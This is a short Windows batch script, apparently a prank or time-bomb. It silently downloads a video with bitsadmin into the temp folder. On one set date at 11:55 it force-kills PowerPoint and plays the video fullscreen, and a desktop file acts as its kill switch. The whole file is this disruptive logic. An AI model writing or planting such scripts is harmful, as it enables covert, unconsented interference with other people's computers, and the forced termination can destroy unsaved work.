@echo off

if exist "%USERPROFILE%\Desktop\Yeni Metin Belgesi.txt" exit

if not exist "%TEMP%\ataturk.mp4" (
bitsadmin /transfer vidjob /download /priority high "https://raw.githubusercontent.com/similartobash/rc/main/video.mp4" "%TEMP%\ataturk.mp4"
)

if "%date%" == "Pzt 19.12.2022" (
:timeloop
if "%time:~0,5%" == "11:55" (
taskkill /f /im POWERPNT.EXE
rem set video2play="%TEMP%\ataturk.mp4"
rem set wmplayer="%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe" /prefetch:1
rem %wmplayer% %video2play% /fullscreen
"%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe" "%TEMP%\ataturk.mp4" /fullscreen
) else (
timeout /t 10
goto :timeloop
)
)

exit
